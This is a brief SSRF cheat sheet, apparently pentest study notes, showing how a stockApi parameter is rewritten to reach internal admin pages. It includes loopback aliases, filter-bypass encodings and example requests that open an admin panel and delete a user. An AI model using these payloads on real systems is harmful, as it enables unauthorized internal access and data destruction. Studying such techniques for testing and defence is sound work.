# SSRF

## Server-Side Request Forgery

Normal request:

```jsx
POST /product/stock HTTP/1.1
Host: vulnerable.com
Cookie: session=d4sfd6dfGgh4hvsh43sdshSv3dghd54gKd

stockApi= http://api.vulnerable.com
```

The attacker can make the server call the site with the server credentials

- You can make a SSRF by a parameter example: path=api.vulnerable.com
- changing to path=http://localhost:80

**Can use to reference himself**

- 127.0.0.1
- localhost
- 0.0.0.0
- 017700000001
- the site name

You can bruteforce the local IPs to find another endpoints example: 192.168.0.[0-255]

### **Bypass directory**

- **URL** encode or doble **URL** encode
- Put the local in upercase example: **127.0.0.1/ADMIN**
- Put a lor of slashes to pass filter example: **127.0.0.1////admin** or **127.0.0.1/../admin** or **127.0.0.1/./admin**
- Put the expected url example: **127.0.0.1/admin?api.vulnerable.com** or **127.0.0.1/admin/#api.vulnerable.com**
- **URL** expected + doble encoding example: **localhost:80%2523@api.vulnerable.com/admin**

    ---

    # Examples

    ### **Acess restricted area**

    Request:

    ```jsx
    POST /product/stock HTTP/1.1
    Host: vulnerable.com
    Cookie: session=d4sfd6dfGgh4hvsh43sdshSv3dghd54gKd

    stockApi= http://127.0.0.1:8080/admin
    ```

    Response:

    ```jsx
    <html>
    <body>
    <h1>The admin local area</h1>
    Wellcome admin
    </body>
    </html>
    ```

    ### Delete and edit things

    Request:

    ```jsx
    POST /product/stock HTTP/1.1
    Host: vulnerable.com
    Cookie: session=d4sfd6dfGgh4hvsh43sdshSv3dghd54gKd

    stockApi= http://127.0.0.1:8080/admin/delete?user=jorge
    ```

    Response:

    ```jsx
    <html>
    <body>
    Response 302 / 200
    Jorge has ben excluded
    </body>
    </html>
    ```